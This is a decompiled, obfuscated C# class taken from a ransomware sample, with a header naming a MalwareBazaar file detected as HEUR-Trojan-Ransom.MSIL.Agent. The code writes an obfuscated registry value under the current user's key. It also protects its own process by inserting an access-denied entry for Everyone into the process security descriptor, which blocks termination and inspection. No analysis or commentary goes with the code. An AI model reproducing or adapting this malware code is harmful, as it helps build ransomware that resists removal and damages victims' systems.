// Decompiled with JetBrains decompiler
// Type: oXSOOyVgTNm.jTgzCArmINf
// Assembly: Skylandshare, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA04C86B-6DB4-4F58-B4B2-0DD203E57103
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-8d268be58a27d2c980b807ffe703ea28b0fd0cd1ba2e455902faebe9ec17c52e.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace oXSOOyVgTNm
{
  internal sealed class jTgzCArmINf
  {
    [NonSerialized]
    internal static GetString \u0013;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool VvxPHFhcJBfR(
      IntPtr DRUfaZMdRjP,
      int sojTKwTNil,
      [Out] byte[] EJAAfwxVzLv,
      uint BITpkGpeNcb,
      out uint aeFmFmChtwbPy);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool XqyaxMdUinRHmjT(
      IntPtr YdDeCTROLTepsOORk,
      int NsgjvFfOJWMmJ,
      [In] byte[] SiRAGVvrFAiaZw);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr mtqhfVuHPmQV();

    public void BrLgMJiobgL([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(NuHMiFuRoVNiZNRl.VrSebPGaWq(jTgzCArmINf.\u0013(107401481)));
        subKey.SetValue(NuHMiFuRoVNiZNRl.VrSebPGaWq(jTgzCArmINf.\u0013(107401888)), (object) jTgzCArmINf.\u0013(107402854));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor eIJURqJQZzWuuXxI([In] IntPtr obj0)
    {
      byte[] EJAAfwxVzLv = new byte[0];
      uint aeFmFmChtwbPy;
      jTgzCArmINf.VvxPHFhcJBfR(obj0, 4, EJAAfwxVzLv, 0U, out aeFmFmChtwbPy);
      if (aeFmFmChtwbPy < 0U || aeFmFmChtwbPy > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !jTgzCArmINf.VvxPHFhcJBfR(obj0, 4, binaryForm = new byte[(IntPtr) aeFmFmChtwbPy], aeFmFmChtwbPy, out aeFmFmChtwbPy) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void aegqQIOVtdv([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      jTgzCArmINf.XqyaxMdUinRHmjT(obj0, 4, numArray);
    }

    public void gGGwGcRhcuAs()
    {
      try
      {
        IntPtr num = jTgzCArmINf.mtqhfVuHPmQV();
        RawSecurityDescriptor securityDescriptor = this.eIJURqJQZzWuuXxI(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.aegqQIOVtdv(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static jTgzCArmINf() => Strings.CreateGetStringDelegate(typeof (jTgzCArmINf));
  }
}
